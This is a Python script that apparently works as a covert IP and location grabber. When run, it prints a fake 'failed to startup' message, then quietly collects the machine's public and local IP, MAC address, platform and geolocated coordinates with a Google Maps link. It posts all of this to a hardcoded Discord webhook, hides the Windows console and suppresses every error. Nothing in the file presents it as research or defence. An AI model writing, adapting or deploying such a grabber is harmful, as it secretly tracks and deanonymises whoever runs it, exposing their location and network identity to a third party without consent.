import requests
import socket
import uuid
import subprocess
from datetime import datetime
from urllib.request import urlopen
import platform
import os

def get_user_timezone():
    """Attempt to get user local timezone"""
    try:
        return datetime.now().astimezone().tzinfo.tzname(None)
    except:
        return "Unknown"

def get_public_ip():
    """Universal public IP detection"""
    try:
        return urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8')
    except:
        return "Unknown"

def get_local_ip():
    """Universal local IP detection"""
    try:
        # More reliable way to get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "Unknown"

def get_mac_address():
    """Universal MAC address detection"""
    try:
        if platform.system() == 'Windows':
            result = subprocess.check_output(['getmac'], text=True, creationflags=0x08000000)
            return result.split('\n')[3].split()[0]
        else:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                          for i in range(0, 8*6, 8)][::-1])
            return mac if mac != "00:00:00:00:00:00" else "Unknown"
    except:
        return "Unknown"

def get_location():
    """Universal location detection"""
    try:
        ip = get_public_ip()
        if ip == "Unknown":
            return "Location unavailable (no IP)"
        
        # First try IP-API
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp', timeout=3)
        if response.status_code == 200:
            geo = response.json()
            if geo.get('status') == 'success':
                return (
                    f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}\n"
                    f"ISP: {geo.get('isp', 'Unknown')}\n"
                    f"Coordinates: {geo.get('lat', 0):.6f}, {geo.get('lon', 0):.6f}"
                )
        return "Location details unavailable"
    except:
        return "Location detection failed"

def send_to_discord():
    """Universal Discord reporting"""
    try:
        TZ_A = get_user_timezone()
        location_info = get_location()
        maps_link = ""
        
        if "Coordinates:" in location_info:
            try:
                coords = location_info.split('Coordinates: ')[1].split(',')
                if len(coords) == 2:
                    maps_link = f"https://www.google.com/maps?q={coords[0].strip()},{coords[1].strip()}"
            except:
                pass

        data = {
            'public_ip': get_public_ip(),
            'local_ip': get_local_ip(),
            'mac': get_mac_address(),
            'location': location_info,
            'platform': platform.platform(),
            'timestamp': datetime.now().strftime(f"%Y-%m-%d %H:%M:%S:%f %z {TZ_A}")
        }

        discord_message = (
            "**🌐 Universal System Report**\n"
            f"🕒 {data['timestamp']}\n"
            f"💻 Platform: `{data['platform']}`\n"
            f"🔌 MAC: `{data['mac']}`\n"
            f"🌐 Public IP: `{data['public_ip']}`\n"
            f"🏠 Local IP: `{data['local_ip']}`\n"
            f"📍 Location:\n```{data['location']}```\n"
        )
        
        if maps_link:
            discord_message += f"🗺️ Maps: {maps_link}"

        requests.post(
            "https://discord.com/api/webhooks/1370088928841039924/yjaNjmkqtmPddOWHmV-wRtt2FPVa6gjN1U7p7_Rdq-a-zNo27NuDTzlBMtcg8KLlY1T5",
            json={"content": discord_message},
            timeout=5
        )
    except Exception as e:
        # For debugging, you might want to log the error
        # print(f"Error sending to Discord: {str(e)}")
        pass

# Main execution
if __name__ == "__main__":
    # Always show failure (as per original script)
    print("failed to startup")
    
    # Execute silently
    send_to_discord()
